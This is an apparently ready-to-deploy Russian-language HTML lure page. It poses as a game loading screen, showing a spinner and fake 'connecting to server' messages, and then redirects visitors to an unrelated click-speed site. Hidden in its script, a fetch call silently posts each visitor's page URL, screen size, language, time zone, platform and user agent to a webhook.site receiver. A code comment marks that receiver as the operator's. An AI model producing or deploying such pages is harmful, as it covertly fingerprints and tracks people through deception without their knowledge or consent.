<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Загрузка...</title>
<style>
  body{font-family:system-ui,sans-serif;background:#0d0d0d;color:#eee;
       display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden}
  .box{text-align:center}
  .spin{width:48px;height:48px;border:4px solid #333;border-top-color:#2a6;
        border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}
  @keyframes s{to{transform:rotate(360deg)}}
  p{opacity:.8;font-size:15px;margin:5px 0}
</style>
</head>
<body>
<div class="box">
  <div class="spin"></div>
  <p id="msg">Загружаем игру...</p>
</div>

<script>
// ==== ТВОЙ ПРИЁМНИК (не меняй) ====
const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";

// ==== КУДА РЕДИРЕКТИТЬ (веду на простую игру-кликер) ====
const REDIRECT_TO = "https://clickspeedtest.com/";

// ---- 1. Шлём данные на webhook ----
fetch(HOOK, {
  method: "POST",
  mode: "no-cors",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({
    event: "visit",
    page: location.href,
    ts: new Date().toISOString(),
    screen: screen.width + "x" + screen.height,
    lang: navigator.language,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    platform: navigator.platform,
    ua: navigator.userAgent
  })
}).catch(function(){});

// ---- 2. Анимация загрузки ----
var msg = document.getElementById("msg");
var steps = ["Загружаем игру...", "Подключаемся к серверу...", "Почти готово..."];
var i = 0;
var tick = setInterval(function(){
  i++;
  if (i < steps.length) msg.textContent = steps[i];
  else clearInterval(tick);
}, 1000);

// ---- 3. Редирект через 3 секунды ----
setTimeout(function(){ location.href = REDIRECT_TO; }, 3000);
</script>
</body>
</html>
